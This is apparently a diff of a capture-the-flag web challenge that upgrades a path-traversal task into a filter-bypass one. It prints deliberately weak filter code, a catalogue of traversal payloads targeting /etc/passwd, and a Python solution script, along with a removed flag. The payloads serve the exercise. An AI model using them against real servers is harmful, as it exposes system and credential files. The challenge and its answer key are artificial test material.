@@ -1,26 +1,113 @@
-# Challenge 14: Path Traversal
+# Challenge 14: Filter Bypass (Upgraded from Path Traversal)
 # Category: Web
-# Points: 350
-# Difficulty: Medium
+# Points: 400
+# Difficulty: MEDIUM-HARD
 
 ## Description
-This file viewer lets you read files from the server. But can you read files you're not supposed to access?
+I added filters to prevent path traversal attacks. But can you bypass ALL of them?
 
-[Host the Flask app]
+**Service:** `http://HOST:5005`
 
-## Flag
-flag{path_traversal_reads_sensitive_files}
+## Security Filters (Multiple Layers!)
+
+The server now has these filters:
+
+```python
+# Filter 1: Block ../
+if '../' in filename:
+    return "Blocked!"
+
+# Filter 2: Block encoded variants
+if '%2e%2e%2f' in filename.lower():
+    return "Blocked!"
+
+# Filter 3: Block null bytes
+if '%00' in filename:
+    return "Blocked!"
+
+# Filter 4: Block absolute paths
+if filename.startswith('/'):
+    return "Blocked!"
+
+# Filter 5: Normalize path
+filename = os.path.normpath(filename)
+```
+
+## Bypass Techniques
+
+### 1. Double Encoding
+```
+..%252f → decoded once → ..%2f → decoded twice → ../
+```
+
+### 2. UTF-8 Encoding
+```
+..%c0%af → overlong encoding for /
+```
+
+### 3. Path Truncation
+```
+././././././././././etc/passwd
+```
+
+### 4. Null Byte (if not filtered)
+```
+../../../etc/passwd%00.png
+```
+
+### 5. Case Sensitivity
+```
+../ → check if filter is case-sensitive
+..%2F → uppercase hex
+```
+
+### 6. Double Slashes
+```
+..//..//..//etc/passwd
+```
+
+### 7. Dot Tricks
+```
+....//....//etc/passwd
+```
+
+### 8. Windows Path (if applicable)
+```
+..\..\..\etc\passwd
+```
 
 ## Solution
-Use path traversal (../) to access files outside the intended directory:
 
-```
-http://localhost:5004?file=../private/flag.txt
+```python
+import requests
+
+# Try multiple bypass techniques
+payloads = [
+    "....//....//....//etc/passwd",
+    "..%252f..%252f..%252fetc/passwd",
+    "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "..%255c..%255c..%255cetc/passwd",
+    "..%00/..%00/..%00/etc/passwd",
+    "/var/www/html/../../../etc/passwd",
+]
+
+for payload in payloads:
+    r = requests.get(f"http://localhost:5005?file={payload}")
+    if "flag{" in r.text:
+        print(f"Found: {payload}")
+        print(r.text)
+        break
 ```
 
-Or URL encoded:
-```
-http://localhost:5004?file=..%2Fprivate%2Fflag.txt
-```
+## Tools Needed
+- Burp Suite - Intercept and modify requests
+- CyberChef - Encoding/decoding
+- Python `requests` - Automation
+- Browser DevTools
 
-The server incorrectly sanitizes the path, allowing access to files outside the `files/` directory.
+## Hints
+1. Filter bypass is a cat-and-mouse game
+2. Try multiple encoding layers
+3. Check if the filter normalizes before or after checking
+4. Path normalization can be tricky with `os.path.normpath`
+5. Sometimes the filter logic has order-of-operations bugs
